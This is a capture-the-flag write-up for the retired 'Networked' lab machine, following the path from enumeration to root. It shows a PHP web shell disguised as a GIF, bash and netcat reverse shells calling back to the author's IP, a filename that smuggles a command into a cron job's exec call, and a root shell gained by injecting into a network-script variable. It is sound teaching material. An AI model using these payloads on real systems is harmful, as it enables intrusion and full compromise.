# Networked

This is the write-up for the box Networked that got retired at the 16th November 2019.
My IP address was 10.10.14.11 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.146    networked.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/networked.nmap 10.10.10.146
```

```
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
```

Port 443 came back as _closed_ but the fact that it sent this information back, means that there is a firewall that blocked the connection.

## Checking HTTP (Port 80)

On the web page are three sentences:
```
Hello mate, we're building the new FaceMash!
Help by funding us and be the new Tyler&Cameron!
Join us at the pool party this Sat to get a glimpse
```

In the HTML source code is one comment:
```
<!-- upload and gallery not yet linked -->
```

By manually browsing to _index.html_, it responds with the status code _404 Not Found_, while _index.php_ is found and that is how we know a PHP server is running in the background.
Lets search for hidden directories and PHP files with **Gobuster**:
```
gobuster -u http://10.10.10.146 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

It found the following directories and files:
- /uploads
  - Blank page
- /backup
  - Index with _backup.tar_ file
- /photos.php
  - Some images with the following names in the _/uploads_ directory:
    - _uploads/127_0_0_1.png_
    - _uploads/127_0_0_2.png_
    - _uploads/127_0_0_3.png_
    - _uploads/127_0_0_4.png_
- /upload.php
  - Uploading files button
- /lib.php
  - Blank page

Extracting files from _backup.tar_:
```
tar -xvf backup.tar
```

In the tar archive is the source code of all PHP files from the website.
The file _upload.php_ has interesting code as it allows to upload files:
- Function _check_file_type_ checks for file types
  - This function is declared in _lib.php_ and looks for **MIME types** starting with _"image/"_
- Checks that the file size has to be below 60000 bytes
- Checks that the filename ends with the extension of image files

Lets create a PHP shell file that begins with the **Magic bytes** of GIF images and has _.gif_ as the file extension:
```
GIF8;
<?php system($_REQUEST['cmd']); ?>
```

After uploading the file _shell.php.gif_ on _/upload_, the page says that it was uploaded successfully:
```
file uploaded, refresh gallery
```

The web shell can be found in _/photos.php_ and by testing the `whoami` command, it outputs the username _apache_ and proofs command execution:
```
http://10.10.10.146/uploads/10_10_14_11.php.gif?cmd=whoami
```

Executing a reverse shell command:
```
GET /uploads/10_10_14_11.php.gif?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.11/9001 0>&1'
```

After URL-encoding and sending it, the listener on my IP and port 9001 starts a reverse shell session as _apache_.

## Privilege Escalation

In the home directory _/home/guly_ is a **Crontab file** that runs _check_attack.php_ every 3 minutes:
```
*/3 * * * * php /home/guly/check_attack.php
```

The PHP file _check_attack.php_ uses the `exec` function to remove files from _/var/www/html/uploads_:
```
(...)
$path = '/var/www/html/uploads/';
(...)
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
(...)
```

The variable _value_ is for the file names and as we have control over that, it is possible to execute commands by adding another command after the `rm` with a semicolon, so it looks like this:
```
exec("nohup /bin/rm -f /var/www/html/uploads/;reverse shell command
```

Creating file in _/var/www/html/uploads_:
```
touch -- ';nc -c bash 10.10.14.11 9002;.php'
```

After three minutes, the cronjob runs the PHP file, the `exec` function runs the `nc` command and the listener on my IP and port 9002 starts a reverse shell session as _guly_.

### Privilege Escalation to root

The user _guly_ has sudo permissions to run a script called _changename.sh_ as root:
```
sudo -l
```
```
(...)
User guly may run the following commands on networked:
   (root) NOPASSWD: /usr/local/sbin/changename.sh
```

After executing it, it asks for variables and writes the input into _/etc/sysconfig/network-scripts/ifcfg-guly_ and then runs `/sbin/ifup guly0`:
```
sudo /usr/local/sbin/changename.sh
```
```
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=Test1
PROXY_METHOD=Test2
BROWSER_ONLY=Test3
BOOTPROTO=TCP
```

As described in [this Nmap full disclosure mailing list](https://seclists.org/fulldisclosure/2019/Apr/24), it is possible to execute code with network scripts, by passing a command into one of the variables with a _space character_:
```
interface NAME:
Test1
interface PROXY_METHOD:
Test2
interface BROWSER_ONLY:
Test3 bash
interface BOOTPROTO:
TCP
```

The `bash` command in the _BROWSER_ONLY_ variable gets executed and immediately starts a shell as root!
